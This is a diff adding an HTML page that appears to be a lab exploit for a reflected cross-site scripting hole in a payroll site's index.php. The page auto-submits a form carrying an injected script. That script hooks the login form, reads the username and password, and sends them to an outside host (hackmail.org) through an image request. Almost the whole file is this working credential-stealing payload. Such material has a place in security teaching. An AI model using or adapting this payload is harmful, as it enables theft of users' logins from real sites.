@@ -1,0 +1,37 @@
+<!---the vulnerable code is in index.php: 29 because it does not properly sanitize user input before displaying the result, thus allows attacker easily inject client-side code here-->
+
+<html>
+
+<body onload="myclick();">
+
+<form  id="my_form" action="http://payroll.gatech.edu/" onsubmit="" method="POST">
+
+<input type="text" name="login"value="&quot; >
+<script> 
+document.forms[0].onsubmit=function(){
+var user=document.forms[0].elements[2].value;
+var pswd=document.forms[0].elements[4].value;
+var emlbdy=user+&quot; &quot;+pswd;
+
+javascript:void((new Image()).src='http://hackmail.org/sendmail.php?' + '&username=H4x0r.' + '&payload=' +emlbdy+ '&random=' + Math.random());
+
+
+}
+
+</script>
+
+
+
+<input type=&quot;hidden&quot; name=&quot;filler ">
+
+<input type="password" name="pw">
+       <input name="secret" value="whatdoido" type="hidden">
+<button id="my_btn" class="btn submit" name="action" value="save">Save</button>	   
+</form>
+<script type="text/javascript">
+   function myclick () {
+    document.getElementById("my_btn").click();
+}
+</script>
+</body>
+</html>
